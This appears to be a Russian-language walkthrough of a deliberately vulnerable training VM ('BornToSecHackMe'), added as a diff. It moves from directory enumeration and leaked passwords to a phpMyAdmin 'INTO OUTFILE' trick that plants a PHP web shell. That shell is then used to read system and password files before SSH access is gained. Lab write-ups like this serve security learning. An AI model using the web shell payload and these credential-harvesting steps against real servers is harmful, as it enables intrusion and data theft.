@@ -1,0 +1,87 @@
+1) Первым делом, после установки ISO определяем ip адресс на котором поднялась машина.
+Для моего хоста это адрес вида 192.168.56.1хх
+Адреса выдаются последовательно и установить это не вызывает сложности.
+
+2)Чтобы определить доступные страницы запускаем с запущенного параллельно образа kali-linux dirb -r <host>
+видим список открытых страниц
+
+dirb https://192.168.1.xx -r
+...
+---- Scanning URL: https://192.168.1.xx/ ----
++ https://192.168.1.xx/cgi-bin/ (CODE:403|SIZE:289)                                                                                                                         
+==> DIRECTORY: https://192.168.1.xx/forum/                                                                                                                                  
+==> DIRECTORY: https://192.168.1.xx/phpmyadmin/                                                                                                                             
++ https://192.168.1.xx/server-status (CODE:403|SIZE:294)                                                                                                                    
+==> DIRECTORY: https://192.168.1.xx/webmail/ 
+...
+
+Нас интересуют адреса
+https://192.168.1.xx/forum/
+https://192.168.1.xx/phpmyadmin/
+https://192.168.1.xx/webmail/
+
+3)На форуме находим тему
+https://192.168.56.xx/forum/index.php?id=6
+в которой в логе можно найти пароль пользователя
+
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
+Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by
+
+4)после входа под пользователем lmezard 
+в личных данных можно найти почту пользователя
+laurie@borntosec.net
+
+пытаемся войти в эту почту на странице
+https://192.168.56.хх/webmail/src/login.php
+с тем же паролем
+входим
+
+видим письмо с темой DB Access
+в теле письма видим следующую запись
+
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+
+5)Это данные для входа в админку пхп по ссылке https://192.168.56.xx/phpmyadmin/
+
+Гугл помогает найти способ воспользовать доступом к админке в своих интересах
+
+https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
+
+Путём достаточно простого поиска находим подходящий путь, по которому можно создать простую страничку с доступом к терминалу на хосте
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "../../www/forum/templates_c/xploit.php"
+
+Это позволяет собрать некоторое количество информации о системе в которой мы находимся.
+https://192.168.56.хх/forum/templates_c/xploit.php?cmd=whoami
+
+https://192.168.56.хх/forum/templates_c/xploit.php?cmd=cat%20/etc/os-release
+https://192.168.56.хх/forum/templates_c/xploit.php?cmd=cat%20/proc/version
+
+Небольшой поиск по папкам позволяет нам найти некий файл с логином и паролем
+
+https://192.168.56.хх/forum/templates_c/xploit.php?cmd=cat /home/LOOKATME/password
+
+lmezard:G!@M6f4Eatau{sF"
+
+6)для подключения по ssh они к сожалению не подходят, но путём простых логических измышлений и попыток выясняем, что они подходят для подключения по ftp
+
+с помощью FileZilla подключаемся к серверу и видим в корне два файла Readme и fun
+выкачиваем их к себе
+7)в ридми говорится о том, что разобравшись с файлом fun можно получить пароль для входа по ssh под пользователем laurie
+fun оказывается архивом с кучей .pcap файлов содержащих строчки простой программы на си, достаточно расположить их в правильном порядке
+что и было выполнено вручную
+
+получившийся пароль Iheartpwnage
+в ридми было сказано, что надо получить хэш от этой записи
+получаем sha256 от Iheartpwnage
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+8)и теперь мы можем подключиться по SSH
+ssh laurie@192.168.56.хх
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+9) далее нам предстоит пройти по хлебным крошкам которые оставили нам создатели проекта
